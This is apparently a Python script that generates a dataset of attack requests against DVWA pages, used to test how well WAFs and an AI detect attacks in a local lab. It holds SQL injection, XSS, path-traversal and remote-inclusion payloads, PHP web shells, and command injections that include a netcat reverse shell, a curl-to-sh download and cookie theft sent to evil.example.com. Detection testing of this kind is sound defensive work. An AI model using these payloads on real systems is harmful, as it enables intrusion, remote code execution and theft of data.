"""DVWA 엔드포인트를 겨냥한 공격 요청 세트를 샘플 JSONL로 만든다. (T2 공격 탐지 일반화 측정)

목적: 학습·튜닝에 쓰지 않은 사이트(DVWA)의 공격을 WAF(ModSecurity·Coraza)와 AI가 얼마나 탐지하는지
본다. 각 요청은 실제 DVWA 취약 페이지의 경로·파라미터에 공격 페이로드를 넣은 것이다. 로컬 실험실
전용이며, 판정은 실험실 더미 백엔드 앞에서 이뤄져 DVWA가 실제로 털리는 것과는 무관하다.

페이로드는 공개적으로 널리 알려진 표준 점검용이다. 공격 유형(label_families)별로 묶어 유형별
탐지율을 낸다. 서명 기반 WAF나 주입 패턴 위주로 학습한 AI가 구조적으로 못 보는 유형(CSRF·무차별
대입·오픈 리다이렉트)은 따로 묶어 "비페이로드"로 표시한다.

출력: dev_tools/datasets/t2-dvwa/dvwa-attacks.jsonl (run_pipeline_test.py 입력 형식)
"""
import argparse
import json
from pathlib import Path
from urllib.parse import quote

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36")


def headers(ct: str = "") -> list:
    h = [["host", "<host>"], ["user-agent", UA],
         ["accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"],
         ["accept-language", "ko-KR,ko;q=0.9,en;q=0.8"]]
    if ct:
        h.append(["content-type", ct])
    return h


# (family, path, param, [payloads])  — GET 쿼리 공격
SQLI = ["1' OR '1'='1", "1' OR '1'='1' -- -", "1' OR 1=1#", '1" OR "1"="1',
        "1' UNION SELECT user,password FROM users-- -", "1' UNION SELECT NULL,@@version-- -",
        "1' AND SLEEP(5)-- -", "1' AND 1=1-- -", "1' AND 1=2-- -", "1'; DROP TABLE users-- -",
        "1' ORDER BY 5-- -", "1' AND extractvalue(1,concat(0x7e,@@version))-- -",
        "1'/**/OR/**/'1'='1", "1' OR 'a'='a", "-1' UNION SELECT 1,group_concat(table_name) "
        "FROM information_schema.tables-- -", "1' PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x3a,version())),1)-- -"]
XSS = ["<script>alert(1)</script>", "<script>alert(document.cookie)</script>",
       "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>", "<body onload=alert(1)>",
       '"><script>alert(1)</script>', "<iframe src=javascript:alert(1)>", "javascript:alert(1)",
       "<input autofocus onfocus=alert(1)>", "<details open ontoggle=alert(1)>",
       "<script>fetch('//evil.example.com/'+document.cookie)</script>",
       "<a href=javascript:alert(1)>x</a>", "<marquee onstart=alert(1)>", "<img src=x onerror=eval(name)>"]
CMDI = ["127.0.0.1;cat /etc/passwd", "127.0.0.1|whoami", "127.0.0.1 && id", "127.0.0.1 || ls -la",
        "127.0.0.1;nc -e /bin/sh evil.example.com 4444", "`id`", "$(whoami)",
        "127.0.0.1%0acat /etc/passwd", "127.0.0.1; curl http://evil.example.com/sh | sh",
        ";cat /etc/shadow", "|id", "127.0.0.1 & ping -c 10 127.0.0.1"]
LFI = ["../../../../../../etc/passwd", "....//....//....//etc/passwd",
       "..%2f..%2f..%2f..%2fetc%2fpasswd", "..%252f..%252f..%252fetc%252fpasswd", "/etc/passwd",
       "../../../../etc/passwd%00", "php://filter/convert.base64-encode/resource=index.php",
       "php://input", "expect://id", "../../../../var/log/apache2/access.log",
       "C:\\windows\\win.ini", "..\\..\\..\\..\\windows\\win.ini"]
RFI = ["http://evil.example.com/shell.txt", "https://evil.example.com/shell.php",
       "http://192.0.2.1/shell.txt", "ftp://evil.example.com/shell.txt",
       "http://evil.example.com/shell.txt?", "//evil.example.com/shell.txt"]


def q(value: str) -> str:
    return quote(value, safe="")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", type=Path, default=Path("dev_tools/datasets/t2-dvwa/dvwa-attacks.jsonl"))
    args = ap.parse_args()
    rows = []

    def add(family, method, path, query="", body="", ct=""):
        rows.append({"sample_id": f"a{len(rows) + 1:05d}", "source": "dvwa", "record_id": family,
                     "label_binary": 1, "label_families": [family], "method": method, "path": path,
                     "query": query, "headers": headers(ct), "body": body, "content_type": ct})

    # SQLi: sqli, sqli_blind, 로그인 폼
    for i, p in enumerate(SQLI):
        page = "/vulnerabilities/sqli/" if i % 2 == 0 else "/vulnerabilities/sqli_blind/"
        add("sqli", "GET", page, f"id={q(p)}&Submit=Submit")
    login_sqli = q("admin'-- -")
    add("sqli", "POST", "/login.php", "", f"username={login_sqli}&password=x&Login=Login",
        "application/x-www-form-urlencoded")

    # XSS: 반사형, DOM, 저장형(본문)
    for i, p in enumerate(XSS):
        if i % 3 == 2:
            add("xss", "GET", "/vulnerabilities/xss_d/", f"default={q(p)}")
        else:
            add("xss", "GET", "/vulnerabilities/xss_r/", f"name={q(p)}")
    for p in XSS[:3]:
        add("xss", "POST", "/vulnerabilities/xss_s/",
            "", f"txtName=Guest&mtxMessage={q(p)}&btnSign=Sign+Guestbook",
            "application/x-www-form-urlencoded")

    # 명령 삽입 (exec, POST)
    for p in CMDI:
        add("cmd_injection", "POST", "/vulnerabilities/exec/",
            "", f"ip={q(p)}&Submit=Submit", "application/x-www-form-urlencoded")

    # LFI / 경로 조작, RFI (fi, GET)
    for p in LFI:
        add("path_traversal", "GET", "/vulnerabilities/fi/", f"page={q(p)}")
    for p in RFI:
        add("rfi", "GET", "/vulnerabilities/fi/", f"page={q(p)}")

    # 파일 업로드 웹셸 (multipart, 본문이 ASCII라 재생에 안전)
    shells = [("shell.php", "application/x-php", "<?php system($_GET['cmd']); ?>"),
              ("shell.phtml", "application/octet-stream", "<?php echo shell_exec($_REQUEST['c']); ?>"),
              ("shell.php.jpg", "image/jpeg", "<?php eval($_POST['x']); ?>"),
              ("shell.gif", "image/gif", "GIF89a;<?php passthru($_GET['cmd']); ?>")]
    boundary = "----WebKitFormBoundaryDVWA7MA4YWxkTrZ"
    for name, ftype, content in shells:
        body = (f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="uploaded"; filename="{name}"\r\n'
                f"Content-Type: {ftype}\r\n\r\n{content}\r\n"
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="Upload"\r\n\r\nUpload\r\n'
                f"--{boundary}--\r\n")
        add("upload_webshell", "POST", "/vulnerabilities/upload/", "", body,
            f"multipart/form-data; boundary={boundary}")

    # 비페이로드(요청 내용만으로는 탐지하기 어려운 유형) — 따로 집계
    add("csrf", "GET", "/vulnerabilities/csrf/",
        "password_new=hacked123&password_conf=hacked123&Change=Change")
    for pw in ("admin", "password", "123456", "letmein"):
        add("brute_force", "GET", "/vulnerabilities/brute/", f"username=admin&password={pw}&Login=Login")
    add("open_redirect", "GET", "/vulnerabilities/open_redirect/", f"redirect={q('http://evil.example.com')}")
    add("open_redirect", "GET", "/vulnerabilities/open_redirect/", f"redirect={q('//evil.example.com')}")

    args.out.parent.mkdir(parents=True, exist_ok=True)
    with open(args.out, "w", encoding="utf-8") as f:
        for r in rows:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")
    from collections import Counter
    fams = Counter(r["label_families"][0] for r in rows)
    print(f"공격 {len(rows)}건 → {args.out}")
    for fam, n in fams.most_common():
        print(f"  {fam}: {n}")


if __name__ == "__main__":
    main()
